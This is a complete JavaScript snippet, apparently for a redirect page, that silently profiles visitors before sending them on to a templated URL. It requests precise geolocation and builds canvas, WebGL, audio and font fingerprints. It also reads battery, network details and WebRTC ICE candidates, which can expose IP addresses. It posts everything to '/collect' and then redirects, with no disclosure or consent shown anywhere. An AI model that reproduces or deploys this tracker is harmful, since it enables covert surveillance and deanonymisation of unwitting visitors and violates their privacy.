<script>
const REDIRECT_URL = JSON.parse('{{ redirect_url | tojson }}');
(async function () {

    function safe(value) {
        try {
            return value;
        } catch {
            return null;
        }
    }
    async function getFontFingerprint() {
    try {
        const fontsToTest = [
            "Arial",
            "Arial Black",
            "Calibri",
            "Cambria",
            "Comic Sans MS",
            "Consolas",
            "Courier New",
            "Georgia",
            "Helvetica",
            "Impact",
            "Inter",
            "Lucida Console",
            "Microsoft Sans Serif",
            "Segoe UI",
            "Tahoma",
            "Times New Roman",
            "Trebuchet MS",
            "Verdana",
            "Roboto",
            "Noto Sans",
            "Ubuntu",
            "DejaVu Sans",
            "Liberation Sans",
            "Fira Code",
            "Fira Sans"
        ];

        const testString =
            "mmmmmmmmmmlliWWWW1111@@@@####";

        const canvas = document.createElement("canvas");
        const ctx = canvas.getContext("2d");

        if (!ctx) return null;

        const baseFont = "monospace";
        ctx.font = `72px ${baseFont}`;

        const baseWidth = ctx.measureText(testString).width;

        const detected = [];

        for (const font of fontsToTest) {
            ctx.font = `72px "${font}", ${baseFont}`;

            const width = ctx.measureText(testString).width;

            if (width !== baseWidth) {
                detected.push(font);
            }
        }

        return {
            detectedFonts: detected,
            count: detected.length,
            fingerprint: await sha256(detected.join("|"))
        };

    } catch {
        return null;
    }
}
async function getBatteryStatus() {
    try {
        if (!navigator.getBattery) {
            return {
                supported: false,
                reason: "Battery API not supported"
            };
        }

        const battery = await navigator.getBattery();

        return {
            supported: true,
            level: Math.round(battery.level * 100),
            charging: battery.charging,
            chargingTime: battery.chargingTime,
            dischargingTime: battery.dischargingTime
        };

    } catch (error) {
        return {
            supported: false,
            reason: "Battery information unavailable"
        };
    }
}


function getNetworkStatus() {
    try {
        const connection =
            navigator.connection ||
            navigator.mozConnection ||
            navigator.webkitConnection;

        if (!connection) {
            return {
                supported: false,
                reason: "Network Information API not supported"
            };
        }

        return {
            supported: true,
            effectiveType: connection.effectiveType || null,
            type: connection.type || null,
            downlink: connection.downlink ?? null,
            downlinkMax: connection.downlinkMax ?? null,
            rtt: connection.rtt ?? null,
            saveData: connection.saveData ?? null
        };

    } catch (error) {
        return {
            supported: false,
            reason: "Network information unavailable"
        };
    }
}
async function getPreciseLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve({
                supported: false,
                granted: false
            });
            return;
        }

        navigator.geolocation.getCurrentPosition(
            (position) => {
                resolve({
                    supported: true,
                    granted: true,
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracyMeters: position.coords.accuracy
                });
            },
            (error) => {
                resolve({
                    supported: true,
                    granted: false,
                    reason: error.message
                });
            },
            {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );
    });
}

    const data = {
    location: await getPreciseLocation(),

    language: safe(navigator.language),
    languages: safe(navigator.languages),

    platform: safe(navigator.platform),
    userAgent: safe(navigator.userAgent),

    cookieEnabled: safe(navigator.cookieEnabled),
    doNotTrack: safe(navigator.doNotTrack),
    online: safe(navigator.onLine),

    hardwareConcurrency:
        safe(navigator.hardwareConcurrency),

    deviceMemory:
        safe(navigator.deviceMemory),

    maxTouchPoints:
        safe(navigator.maxTouchPoints),

    screen:
        safe(`${screen.width}x${screen.height}`),

    screenWidth:
        safe(screen.width),

    screenHeight:
        safe(screen.height),

    availableWidth:
        safe(screen.availWidth),

    availableHeight:
        safe(screen.availHeight),

    colorDepth:
        safe(screen.colorDepth),

    pixelDepth:
        safe(screen.pixelDepth),

    viewportWidth:
        safe(window.innerWidth),

    viewportHeight:
        safe(window.innerHeight),

    devicePixelRatio:
        safe(window.devicePixelRatio),

    timezone:
        safe(
            Intl.DateTimeFormat()
                .resolvedOptions()
                .timeZone
        ),

    timezoneOffset:
        safe(new Date().getTimezoneOffset()),

    darkMode:
        safe(
            window.matchMedia(
                "(prefers-color-scheme: dark)"
            ).matches
        ),

    lightMode:
        safe(
            window.matchMedia(
                "(prefers-color-scheme: light)"
            ).matches
        ),

    reducedMotion:
        safe(
            window.matchMedia(
                "(prefers-reduced-motion: reduce)"
            ).matches
        ),

    touchSupported:
        safe("ontouchstart" in window),

    page:
        safe(window.location.href),

    referrer:
        safe(document.referrer),

    clientTime:
        new Date().toISOString(),

    // Fingerprint signals
    canvasFingerprint:
        await getCanvasFingerprint(),

    webgl:
        safe(getWebGLFingerprint()),

    audioFingerprint:
        await getAudioFingerprint(),
    
    webrtc:
        await getWebRTCDiagnostics(),

    fonts:
        await getFontFingerprint(),
        
    battery:
        await getBatteryStatus(),

    network:
        getNetworkStatus()
};

    try {

        const response = await fetch(
            "/collect",
            {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(data)
            }
        );

        // Redirect only after telemetry is sent.
        window.location.replace(REDIRECT_URL);

    } catch (error) {

        // If collection fails, still redirect.
        window.location.replace(REDIRECT_URL);
    }

})();
async function getWebRTCDiagnostics() {
    try {
        if (!window.RTCPeerConnection) {
            return {
                supported: false,
                candidates: []
            };
        }

        const pc = new RTCPeerConnection({
            iceServers: []
        });

        const candidates = [];

        pc.onicecandidate = (event) => {
            if (!event.candidate) return;

            const candidate = event.candidate;

            candidates.push({
                type: candidate.type || null,
                protocol: candidate.protocol || null,
                address: candidate.address || null,
                port: candidate.port || null
            });
        };

        pc.createDataChannel("diagnostic");

        const offer = await pc.createOffer();
        await pc.setLocalDescription(offer);

        await new Promise(resolve => setTimeout(resolve, 1000));

        pc.close();

        return {
            supported: true,
            candidates: candidates
        };

    } catch (error) {
        return {
            supported: false,
            error: String(error)
        };
    }
}
async function getCanvasFingerprint() {
        try {
            const canvas = document.createElement("canvas");
            canvas.width = 280;
            canvas.height = 80;

            const ctx = canvas.getContext("2d");
            if (!ctx) return null;

            ctx.textBaseline = "top";
            ctx.font = "16px Arial";
            ctx.fillStyle = "#f60";
            ctx.fillRect(10, 10, 100, 30);

            ctx.fillStyle = "#069";
            ctx.fillText(
                "Browser fingerprint",
                15,
                20
            );

            ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
            ctx.fillText(
                "canvas-test",
                20,
                45
            );

            return await sha256(canvas.toDataURL());
        } catch {
            return null;
        }
    }


    function getWebGLFingerprint() {
        try {
            const canvas = document.createElement("canvas");

            const gl =
                canvas.getContext("webgl") ||
                canvas.getContext("experimental-webgl");

            if (!gl) {
                return {
                    supported: false
                };
            }

            const debugInfo =
                gl.getExtension("WEBGL_debug_renderer_info");

            let vendor = null;
            let renderer = null;

            if (debugInfo) {
                vendor = gl.getParameter(
                    debugInfo.UNMASKED_VENDOR_WEBGL
                );

                renderer = gl.getParameter(
                    debugInfo.UNMASKED_RENDERER_WEBGL
                );
            }

            return {
                supported: true,
                vendor: vendor,
                renderer: renderer,
                version: gl.getParameter(gl.VERSION),
                shadingLanguageVersion:
                    gl.getParameter(
                        gl.SHADING_LANGUAGE_VERSION
                    ),
                maxTextureSize:
                    gl.getParameter(
                        gl.MAX_TEXTURE_SIZE
                    ),
                maxViewportDims:
                    Array.from(
                        gl.getParameter(
                            gl.MAX_VIEWPORT_DIMS
                        )
                    )
            };

        } catch {
            return {
                supported: false
            };
        }
    }


    async function getAudioFingerprint() {
        try {
            const AudioContext =
                window.OfflineAudioContext ||
                window.webkitOfflineAudioContext;

            if (!AudioContext) {
                return null;
            }

            const context = new AudioContext(
                1,
                44100,
                44100
            );

            const oscillator =
                context.createOscillator();

            const compressor =
                context.createDynamicsCompressor();

            oscillator.type = "triangle";
            oscillator.frequency.value = 10000;

            compressor.threshold.value = -50;
            compressor.knee.value = 40;
            compressor.ratio.value = 12;
            compressor.attack.value = 0;
            compressor.release.value = 0.25;

            oscillator.connect(compressor);
            compressor.connect(context.destination);

            oscillator.start(0);

            const buffer =
                await context.startRendering();

            const channel =
                buffer.getChannelData(0);

            // Only summarize the result instead of
            // sending the entire audio buffer.
            let sum = 0;
            let weighted = 0;

            const step = Math.max(
                1,
                Math.floor(channel.length / 1000)
            );

            for (
                let i = 0;
                i < channel.length;
                i += step
            ) {
                const value = channel[i];

                sum += Math.abs(value);
                weighted += value * (i + 1);
            }

            return await sha256(
                `${sum}|${weighted}|${channel.length}`
            );

        } catch {
            return null;
        }
    }


    async function sha256(value) {
        try {
            const data =
                new TextEncoder().encode(value);

            const hash =
                await crypto.subtle.digest(
                    "SHA-256",
                    data
                );

            return Array.from(
                new Uint8Array(hash)
            )
                .map(
                    byte =>
                        byte
                            .toString(16)
                            .padStart(2, "0")
                )
                .join("");

        } catch {
            return null;
        }
    }
</script>
